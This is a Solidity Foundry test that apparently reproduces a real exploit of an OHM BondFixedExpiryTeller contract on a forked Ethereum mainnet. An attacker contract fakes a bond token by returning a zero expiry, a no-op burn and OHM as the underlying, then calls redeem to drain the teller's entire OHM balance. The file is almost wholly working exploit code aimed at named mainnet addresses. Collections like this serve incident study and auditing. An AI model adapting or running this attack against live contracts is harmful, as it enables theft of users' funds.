pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

//https://www.levi104.com/categories/08-PoC/
contract Attacker is Test {

    IOHM public ohm = IOHM(address(0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5));
    IBondFixedExpiryTeller public BondFixedExpiryTeller = IBondFixedExpiryTeller(address(0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156));

     function setUp() public {
        vm.createSelectFork("mainnet", 15_794_363);

        vm.label(address(ohm), "OHM");
        vm.label(address(BondFixedExpiryTeller), "BondFixedExpiryTeller");
        vm.label(address(this), "attackerContract");
    }

    function test_Exploit() public {
        console.log("[before] address(this) OHM balance",ohm.balanceOf(address(this)));

        uint256 amountToHack = ohm.balanceOf(address(BondFixedExpiryTeller));
        BondFixedExpiryTeller.redeem(address(this), amountToHack);

        console.log("[after] address(this) OHM balance",ohm.balanceOf(address(this)));

        assertEq(amountToHack, ohm.balanceOf(address(this)));
    }

    function expiry() public returns(uint256){
        return 0;
    }

    function burn(address,uint256) public returns(bool){
        return true;
    }

    function underlying() public returns(address){
        return address(ohm);
    }

}